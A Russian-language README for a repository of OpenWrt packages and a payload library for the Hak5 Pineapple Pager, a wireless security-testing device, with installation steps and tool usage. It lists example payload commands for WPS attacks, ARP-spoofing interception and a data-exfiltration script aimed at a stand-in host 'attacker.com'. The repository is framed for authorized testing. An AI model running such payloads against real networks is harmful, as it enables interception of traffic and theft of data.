# OpenWrt 24.10.1 Пакеты для Pineapple Pager

## 📦 Структура проекта

```
Openwrt24-ipk/
├── README.md                    # Главная документация
├── scripts/
│   ├── download-deps.sh         # Скрипт загрузки всех .ipk
│   ├── install-on-pager.sh      # Скрипт установки на Pager
│   ├── install-lib-on-pager.sh  # Установка nullsec-lib.sh
│   └── update-lib.sh            # Обновление библиотеки
├── ipk-cache/                   # Папка для скачанных .ipk файлов
├── library/
│   └── nullsec-lib.sh           # Универсальная библиотека для пейлоудов
├── examples/                    # Примеры пейлоудов
│   ├── README.md                # Документация по примерам
│   ├── wifi-scanner-payload.sh  # WiFi сканер
│   ├── wps-attack-payload.sh    # WPS атаки
│   ├── mitm-attack-payload.sh   # MITM атаки
│   └── data-exfil-payload.sh    # Эксфильтрация данных
├── docs/
│   ├── PACKAGES.md              # Полный список зависимостей
│   ├── INSTALLATION.md          # Инструкция по установке
│   ├── ARCHITECTURE.md          # Описание архитектуры mipsel_24kc
│   └── DEPLOYMENT_REPORT.md     # Отчет о развертывании
└── checksums/
    └── SHA256SUMS               # Контрольные суммы
```

---

## 🚀 Быстрый старт

### На хосте сборки (x86 Linux / macOS):

```bash
# Клонируем репо
git clone <repo> && cd Openwrt24-ipk

# Даём права на выполнение
chmod +x scripts/download-deps.sh scripts/install-on-pager.sh

# Запускаем загрузку
./scripts/download-deps.sh

# Результат: ipk-cache/*.ipk готовы к использованию
ls -lh ipk-cache/
```

### На Pineapple Pager:

```bash
# Если ты закачал .ipk через SCP в /mmc
opkg update
opkg install /mmc/*.ipk -d mmc

# Или через скрипт (автоматизация):
./scripts/install-on-pager.sh
```

---

## 📋 Что входит?

### ✅ СПИСОК 1 — Обязательные (14 пакетов, ~20 MB):

| Пакет | Команда | Назначение | Размер |
|-------|---------|-----------|--------|
| `macchanger` | `macchanger` | Смена MAC адреса | 0.3 MB |
| `curl` | `curl` | HTTP/HTTPS запросы | 0.8 MB |
| `libcurl4` | — | Зависимость curl | 0.6 MB |
| `iwinfo` | `iwinfo` | Информация о WiFi | 0.2 MB |
| `libiwinfo` | — | Зависимость iwinfo | 0.2 MB |
| `pixiewps` | `pixiewps` | WPS Pixie Dust атака | 0.3 MB |
| `ncat` | `ncat` | Netcat (сокеты) | 0.1 MB |
| `socat` | `socat` | Туннель данных | 0.4 MB |
| `jq` | `jq` | Парсинг JSON | 0.5 MB |
| `sqlite3` | `sqlite3` | База данных | 0.8 MB |
| `libsqlite3` | — | Зависимость sqlite3 | 0.3 MB |
| `tmux` | `tmux` | Мультиплексер терминала | 0.8 MB |
| `wget-ssl` | `wget` | Загрузки с SSL | 0.4 MB |
| `libssl3` | — | Зависимость SSL | 1.0 MB |

### 🟡 СПИСОК 2 — Опциональные (6 пакетов):

- `gpsd` — GPS для wardriving
- `libusb-1.0` — USB API
- `usbutils` — USB инструменты
- `openvpn-openssl` — VPN клиент
- `stunnel` — SSL туннель
- `libopenssl1` — SSL зависимость

---

## � NullSec Library & Примеры

### 🔧 Универсальная библиотека (nullsec-lib.sh)

Комплексная Bash библиотека для разработки пейлоудов Hak5 Pineapple Pager:

**Ключевые возможности:**
- ✅ **WiFi операции**: сканирование, подключение, мониторинг
- ✅ **Сетевое взаимодействие**: HTTP, DNS, ICMP, сокеты
- ✅ **Управление данными**: SQLite база данных, JSON обработка
- ✅ **Системные функции**: логирование, фоновые процессы, конфигурация
- ✅ **Безопасность**: валидация, обработка ошибок, очистка

**Установка:**
```bash
# Копирование на устройство
scp library/nullsec-lib.sh root@pineapple:/usr/lib/

# Установка прав
ssh root@pineapple 'chmod +x /usr/lib/nullsec-lib.sh'

# Тестирование
ssh root@pineapple '. /usr/lib/nullsec-lib.sh && nullsec_init && log_info "Библиотека готова"'
```

### 🎯 Примеры пейлоудов

В каталоге `examples/` находятся готовые пейлоуды:

#### 1. WiFi Scanner (`wifi-scanner-payload.sh`)
```bash
./wifi-scanner-payload.sh wlan0 30  # Сканирование каждые 30 сек
```

#### 2. WPS Attack (`wps-attack-payload.sh`)
```bash
./wps-attack-payload.sh AA:BB:CC:DD:EE:FF 6  # Атака на BSSID
```

#### 3. MITM Attack (`mitm-attack-payload.sh`)
```bash
./mitm-attack-payload.sh 192.168.1.100 192.168.1.1 wlan0  # ARP spoofing
```

#### 4. Data Exfiltration (`data-exfil-payload.sh`)
```bash
./data-exfil-payload.sh http://attacker.com:8080 http wlan0  # HTTP эксфильтрация
```

**Подробная документация:** [examples/README.md](examples/README.md)

---

## �🔧 Установка

### Вариант 1: Автоматическая установка через скрипт

```bash
# На Pager (если у тебя есть интернет):
ssh root@pineapple
curl -o install.sh https://raw.githubusercontent.com/.../install-on-pager.sh
chmod +x install.sh
./install.sh
```

### Вариант 2: Ручная установка через SCP

```bash
# С твоего хоста:
scp ipk-cache/*.ipk root@pineapple:/mmc/
ssh root@pineapple

# На Pager:
opkg update
opkg install /mmc/*.ipk -d mmc
```

### Вариант 3: Установка в ROM (рискованно!)

```bash
# На Pager (при достаточно свободного места в RAM):
opkg install /mmc/*.ipk
# ⚠️ Требует проверки: df -h /
```

---

## 🎯 Использование пакетов для пейлоудов

### macchanger

```bash
# Сменить MAC адрес
macchanger -r wlan0

# Установить конкретный MAC
macchanger -m AA:BB:CC:DD:EE:FF wlan0
```

### curl

```bash
# GET запрос
curl https://api.example.com/data

# POST с данными
curl -X POST -d "key=value" https://api.example.com

# С авторизацией
curl -u user:pass https://api.example.com
```

### iwinfo

```bash
# Информация о сети
iwinfo wlan0 info

# Сила сигнала
iwinfo wlan0 txpower

# Список доступных сетей
iwinfo wlan0 scan
```

### pixiewps

```bash
# WPS атака (требует захват WPS хендшейка)
pixiewps -e <PSK1> -s <PSK2> -z <WPS_KEY> -n <MAC>
```

### jq

```bash
# Парсинг JSON
echo '{"name":"John","age":30}' | jq .name

# Фильтрация массивов
curl https://api.example.com/users | jq '.[].email'
```

### sqlite3

```bash
# Создание БД
sqlite3 data.db "CREATE TABLE users (id INT, name TEXT)"

# Вставка данных
sqlite3 data.db "INSERT INTO users VALUES (1, 'Alice')"

# Запрос
sqlite3 data.db "SELECT * FROM users"
```

### tmux

```bash
# Новая сессия
tmux new-session -s work

# Присоединиться к сессии
tmux attach -t work

# Запустить команду в фоне
tmux send-keys -t work "long_command" Enter
```

---

## 📊 Требования к памяти

| Инструмент | Потребление RAM | Комментарий |
|------------|-----------------|-----------|
| macchanger | ~1 MB | Очень легкий |
| iwinfo | ~2 MB | Легкий |
| curl | ~3 MB | Средний |
| jq | ~5 MB | Средний |
| tmux | ~2 MB | Легкий |
| sqlite3 | ~3 MB | Средний |
| Все вместе | ~20 MB | OK для 80 MB Pager |

> ✅ Все пакеты коротко работают и не держат память. Подходят для Pineapple Pager с 80 MB ОЗУ.

---

## ⚠️ Важные замечания

### 1. Архитектура mipsel_24kc

Pineapple Pager использует **ramips/mt76x8** процессор с MIPS Little Endian 24K. Убедись, что все пакеты для `mipsel_24kc`:

```bash
file ipk-cache/*.ipk  # Проверка
```

### 2. Свободное место на /mmc

```bash
# На Pager проверить:
df -h /mmc

# Если нет /mmc:
mkdir -p /mmc
mount /dev/mmcblk0p1 /mmc  # Если microSD не смонтирована
```

### 3. Opkg конфиг для установки на /mmc

```bash
# На Pager добавить строку в /etc/opkg.conf:
echo "dest mmc /mmc" >> /etc/opkg.conf
```

### 4. Обновление списка пакетов

```bash
# Перед установкой всегда:
opkg update
```

---

## 🐛 Решение проблем

### Проблема: "No space left on device"

```bash
# В папке установки.ipk занимает много места на /mmc
# Решение: устанавливай по группам

opkg install -d mmc macchanger curl iwinfo
opkg install -d mmc pixiewps jq tmux
# и так далее...
```

### Проблема: "Package not found"

```bash
# Проверь:
opkg update
opkg list-available | grep -i packagename

# Если не находит — пакет может быть недоступен в 24.10.1
# Попробуй вручную скачать .ipk и установить:
opkg install ./package.ipk -d mmc
```

### Проблема: "Dependency conflicts"

```bash
# Попробуй установить с флагом --force-depends:
opkg install -d mmc --force-depends *.ipk

# ⚠️ Используй с осторожностью!
```

---

## � Обновление nullsec-lib

### Автоматическое обновление
```bash
# На Pineapple Pager
./scripts/update-lib.sh

# Или с кастомным URL
./scripts/update-lib.sh https://your-repo.com/nullsec-lib.sh
```

### Проверка версии
```bash
./scripts/update-lib.sh --check
```

### Откат к предыдущей версии
```bash
./scripts/update-lib.sh --rollback
```

### Ручное обновление
```bash
# Скачать новую версию
curl -o /usr/lib/nullsec-lib.sh https://raw.githubusercontent.com/.../nullsec-lib.sh

# Проверить и применить
chmod +x /usr/lib/nullsec-lib.sh
. /usr/lib/nullsec-lib.sh && nullsec_init
```

---

## �📚 Ссылки

- [OpenWrt 24.10.1 Packages](https://downloads.openwrt.org/releases/24.10.1/packages/mipsel_24kc/)
- [OpenWrt Documentation](https://openwrt.org/docs/start)
- [Pineapple Pager Official](https://shop.hak5.org/)
- [Hak5 Payloads Repository](https://github.com/hak5/wifipineapplepager-payloads)

---

## 📝 Лицензия

Этот репозиторий предназначен исключительно для образовательных и авторизованных тестирований безопасности.
Используй на своем оборудовании или оборудовании, на которое ты имеешь явное разрешение.

---

**Дата создания:** 2026-05-12  
**Версия:** 1.0.0  
**Архитектура:** mipsel_24kc (ramips/mt76x8)  
**OpenWrt версия:** 24.10.1